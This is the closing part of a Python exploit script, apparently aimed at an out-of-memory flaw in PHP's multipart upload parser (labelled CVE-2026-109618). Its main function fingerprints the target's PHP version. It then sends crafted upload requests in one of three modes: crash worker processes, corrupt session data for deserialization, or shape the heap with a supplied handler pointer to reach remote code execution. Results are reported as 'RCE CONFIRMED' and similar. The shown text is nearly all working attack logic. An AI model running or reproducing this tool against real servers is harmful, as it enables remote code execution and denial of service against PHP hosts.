                    help="Seconds to wait for RCE proof")
    ap.add_argument("--retries", type=int, default=3,
                    help="Number of heap-shaping attempts (heap layout is "
                         "probabilistic)")

    args = ap.parse_args()

    print("=" * 60)
    print("CVE-2026-109618 - PHP OOM Corruption via Multipart Parser")
    print("=" * 60)
    print(f"Target: {args.host}:{args.port}{args.path}")
    print(f"Strategy: {args.strategy}")
    print()

    # --- Detect PHP version and check vulnerability ---
    ver_str, ver_tuple = discover_target_php_version(args.host, args.port, args.path)
    if ver_str:
        print(f"[*] PHP version: {ver_str}")
        vuln = is_version_vulnerable(ver_tuple)
        if vuln is True:
            print(f"[*] Status: VULNERABLE (fix applied in "
                  f"{ver_tuple[0]}.{ver_tuple[1]}."
                  f"{PHP_FIXED_VERSIONS.get((ver_tuple[0], ver_tuple[1]), '?')})")
        elif vuln is False:
            print(f"[!] Status: PATCHED -- this version has the OOM fix")
            print(f"    The fix adds ZEND_HAS_OOM() checks and fallible allocations")
            print(f"    OOM during rfc1867 parsing is handled gracefully")
        else:
            print(f"[?] Status: unknown (not in version matrix)")
    else:
        print("[!] Could not detect PHP version from X-Powered-By header")
    print()

    if args.session_corrupt:
        print("Mode: Session corruption (upload_progress OOM -> deserialization)")
    elif args.enable_heapshape:
        print("Mode: Heap Shaping (spray + OOM + RCE verification)")
    else:
        print("Mode: OOM trigger verification")
    print()

    # ---- Session corruption mode ----
    if args.session_corrupt:
        level, detail = run_session_corruption_attack(
            args.host, args.port, args.path,
            num_files=args.num_files,
            fname_size=args.fname_size,
            attempts=args.session_attempts,
        )

        print()
        print("=" * 60)
        print("RESULT")
        print("=" * 60)
        if level == "CONFIRMED":
            print("[+] RCE CONFIRMED via session corruption")
        elif level == "PROBABLE":
            print("[+] Worker crashed reading corrupted session data")
            print("    This confirms the OOM left exploitable state")
        elif level == "POSSIBLE":
            print("[~] Anomaly detected during session deserialization")
            print("    Corrupted session data caused PHP errors")
        else:
            print("[-] Session read survived -- data was not corrupted enough")
            print("    The session serializer may have written a valid snapshot")
        print(f"    {detail}")
        sys.exit(0 if level in ("CONFIRMED", "PROBABLE") else 1)

    # ---- Heap Shaping mode ----
    if args.enable_heapshape:
        handler_ptr = int(args.handler_ptr, 0)
        bomb_kwargs = {
            "num_headers": args.num_headers,
            "header_size": args.header_size,
            "depth": args.depth,
            "width": args.width,
        }

        level, detail = run_heapshape_attack(
            args.host, args.port, args.path,
            strategy=args.strategy,
            spray_count=args.spray_objects,
            handler_ptr=handler_ptr,
            verify_method=args.verify_method,
            proof_timeout=args.proof_timeout,
            retries=args.retries,
            **bomb_kwargs,
        )

        print()
        print("=" * 60)
        print("RESULT")
        print("=" * 60)
        if level == "CONFIRMED":
            print("[+] RCE CONFIRMED -- heap shaping achieved code execution")
        elif level == "PROBABLE":
            print("[+] RCE PROBABLE -- worker crash consistent with "
                  "controlled pointer dereference")
        elif level == "POSSIBLE":
            print("[~] RCE POSSIBLE -- abnormal response, heap influence detected")
        else:
            print("[-] RCE NOT CONFIRMED -- OOM triggered but no RCE indicator")
        print(f"    {detail}")
        print()
        print("Confidence levels:")
        print("  CONFIRMED  = proof of command execution found")
        print("  PROBABLE   = worker crash matches controlled dereference pattern")
        print("  POSSIBLE   = 500 error or abnormal behaviour after shaped OOM")
        print("  DETECTED   = OOM triggered but handler survived or was not reached")
        sys.exit(0 if level in ("CONFIRMED", "PROBABLE") else 1)

    # ---- OOM trigger verification mode ----
    if args.strategy == "files":
        mem_est = args.num_files * 2  # ~2KB per file upload
        print(f"Sending {args.num_files} file uploads "
              f"with {args.fname_size}-byte filenames")
        print(f"Estimated PHP memory: ~{mem_est // 1024}MB")
    elif args.strategy == "headers":
        mem_est = args.num_headers * (args.header_size + 50) // 1024
        print(f"Sending single part with {args.num_headers} custom headers "
              f"x {args.header_size}B")
        print(f"Estimated PHP memory: ~{mem_est // 1024}MB")
    elif args.strategy == "nested":
        print(f"Sending {args.width} empty file controls "
              f"with {args.depth}-deep nesting")
    elif args.strategy == "no_length":
        print(f"Sending {args.total_mb}MB without Content-Length "
              "(bypasses post_max_size)")

    print()
    print("Sending OOM trigger...")

    resp = send_oom_request(args.host, args.port, args.path,
                            strategy=args.strategy,
                            num_files=args.num_files,
                            fname_size=args.fname_size,
                            num_headers=args.num_headers,
                            header_size=args.header_size,
                            depth=args.depth,
                            width=args.width,
                            total_mb=args.total_mb)

    oom_triggered = False
    worker_crashed = False

    if resp:
        status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
        body = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else b""
        print(f"Response: {status}")
        print(f"Size: {len(resp)} bytes")

        if b"500" in status.encode():
            oom_triggered = True
            print("\n[+] Server returned 500 -- OOM bailout triggered")
        elif b"Allowed memory size" in body or b"Fatal error" in body:
            oom_triggered = True
            # Extract allocation size that triggered OOM
            if b"tried to allocate" in body:
                idx = body.find(b"tried to allocate")
                snippet = body[idx:idx + 60].decode("latin1", "replace")
                print(f"\n[+] OOM triggered inside rfc1867 parser")
                print(f"    {snippet}")
            else:
                print("\n[+] OOM triggered (fatal error in response body)")
        else:
            print("\n[-] No OOM detected -- memory_limit not reached")
            print("    Try increasing --num-files or --num-headers")
    else:
        oom_triggered = True
        worker_crashed = True
        print("\n[+] No response -- worker process crashed!")

    if oom_triggered and not worker_crashed:
        # Check if worker survived
        print("\nChecking worker state...")
        time.sleep(1)
        try:
            s = socket.create_connection((args.host, args.port), timeout=5)
            req = (
                f"GET {args.path} HTTP/1.1\r\n"
                f"Host: {args.host}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode()
            s.sendall(req)
            s.settimeout(5)
            r = b""
            while True:
                try:
                    d = s.recv(4096)
                    if not d:
                        break
                    r += d
                except socket.timeout:
                    break
            s.close()
            if r and b"200" in r.split(b"\r\n", 1)[0]:
                print("[*] Worker survived -- OOM was handled by longjmp + cleanup")
                print("    (Expected on stock PHP builds with ZMM heap)")
            elif r:
                worker_crashed = True
                print(f"[+] Abnormal follow-up: "
                      f"{r.split(b'\r\n', 1)[0].decode('latin1', 'replace')}")
            else:
                worker_crashed = True
                print("[+] Worker returned empty response -- degraded state")
        except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
            worker_crashed = True
            print(f"[+] Worker crashed: {e}")

    # Summary
    print()
    print("=" * 60)
    print("SUMMARY")
    print("=" * 60)
    if oom_triggered:
        print("[+] OOM trigger: SUCCESS")
        print("    Memory exhaustion fires inside rfc1867_post_handler")
        print("    (the multipart parser's internal allocation code)")
        if worker_crashed:
            print("[+] Worker crash: YES")
            print("    longjmp() left invalid state that crashed shutdown")
        else:
            print("[-] Worker crash: NO")
            print("    Worker recovered via ZMM heap destruction")
            print()
            print("    NOTE: On stock PHP builds, the ZMM heap is destroyed")
            print("    per-request, reclaiming all leaked memory. A worker")
            print("    crash requires the OOM to corrupt data structures in a")
            print("    way that the hash table destructor walk dereferences")
            print("    uninitialized memory. This is most reliably reproduced")
            print("    with an AddressSanitizer (ASAN) build of PHP.")
            print()
            print("    The vulnerability is confirmed by the PHP 8.2.35 fix:")
            print("    30+ ZEND_HAS_OOM() checks + fallible allocation API")
            print("    added to rfc1867.c to prevent the unsafe state.")
    else:
        print("[-] OOM trigger: FAILED")
        print("    Adjust parameters to exceed target's memory_limit")


if __name__ == "__main__":
    main()
